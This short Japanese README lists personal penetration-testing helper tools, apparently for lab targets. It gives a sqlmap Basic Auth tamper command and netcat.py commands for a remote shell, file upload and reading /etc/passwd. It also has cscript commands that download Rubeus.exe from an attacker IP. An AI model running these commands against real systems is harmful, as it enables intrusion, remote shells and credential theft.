# side_tool
個人的ハックツールに付与できる拡張機能コードリスト

## sqlmap_basic_auth.py
sqlmapコマンドのBasic Auth Base64 Request拡張機能コード
<br/>
コマンド例
```
sqlmap -r ./req --tamper=./sqlmap_basic_auth.py --ignore-code=401 --level 5 --risk 3
```
リクエスト例
```
#req
GET http://example.htb/ HTTP/1.1
Content-Length: 0

...
Authorization: Basic *
```

## netcat.py
Python環境が存在（ほぼある）するターゲットで簡易的に足場を構築するためのもの

```
# 対話型コマンドシェルの起動
netcat.py -t 10.11.14.13 -p 4444 -l -c
# ファイルのアップロード
netcat.py -t 10.11.14.13 -p 4444 -l -u=mytest.whatisup
# コマンドの実行
netcat.py -t 10.11.14.13 -p 4444 -l -e=\"cat /etc/passwd\"
# 通信先サーバーの135番ポートに文字列を送信
echo 'ABCDEFGHI' | ./netcat.py -t 10.11.14.13 -p 135
# サーバーに接続
netcat.py -t 10.11.14.13 -p 4444
```
## windows_wget_script
Windows標準で組み込まれているスクリプト言語を使ってWgetを実行する物

CMD例：
```
#Javascript
cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe

#VBS
cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe
```
